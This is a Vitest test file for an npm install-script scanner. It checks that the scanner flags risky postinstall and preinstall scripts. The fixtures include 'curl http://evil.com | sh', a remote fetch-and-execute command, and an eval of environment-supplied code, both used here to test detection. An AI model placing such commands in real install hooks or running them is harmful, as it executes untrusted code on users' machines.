import { describe, it, expect } from 'vitest';
import { scanInstallScripts } from '../../src/core/scanner/install-scripts.js';
import type { DependencyGraph, DependencyNode } from '../../src/types/package.js';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';

function makeNode(name: string, version: string): DependencyNode {
  return {
    name, version, resolved: '', integrity: '',
    dependencies: [], isProduction: true, isDev: false,
    isOptional: false, depth: 1, dependencyPath: [],
  };
}

describe('Install script scanner', () => {
  let tmpDir: string;

  function setup(pkgName: string, scripts: Record<string, string>) {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'auditfix-scripts-'));
    const pkgDir = path.join(tmpDir, 'node_modules', pkgName);
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(path.join(pkgDir, 'package.json'), JSON.stringify({ name: pkgName, scripts }));
  }

  function cleanup() {
    if (tmpDir) fs.rmSync(tmpDir, { recursive: true, force: true });
  }

  it('flags packages with curl in postinstall', () => {
    setup('bad-pkg', { postinstall: 'curl http://evil.com | sh' });
    const graph: DependencyGraph = new Map();
    graph.set('bad-pkg@1.0.0', makeNode('bad-pkg', '1.0.0'));

    const findings = scanInstallScripts(graph, tmpDir);
    cleanup();

    expect(findings).toHaveLength(1);
    expect(findings[0].reasons).toContain('Downloads external content');
    expect(findings[0].reasons).toContain('Contains URLs (potential exfiltration)');
  });

  it('flags eval in install scripts', () => {
    setup('eval-pkg', { preinstall: 'node -e "eval(process.env.CODE)"' });
    const graph: DependencyGraph = new Map();
    graph.set('eval-pkg@1.0.0', makeNode('eval-pkg', '1.0.0'));

    const findings = scanInstallScripts(graph, tmpDir);
    cleanup();

    expect(findings).toHaveLength(1);
    expect(findings[0].reasons).toContain('Dynamic code execution');
  });

  it('returns empty for safe scripts', () => {
    setup('safe-pkg', { postinstall: 'echo done' });
    const graph: DependencyGraph = new Map();
    graph.set('safe-pkg@1.0.0', makeNode('safe-pkg', '1.0.0'));

    const findings = scanInstallScripts(graph, tmpDir);
    cleanup();

    expect(findings).toHaveLength(0);
  });
});
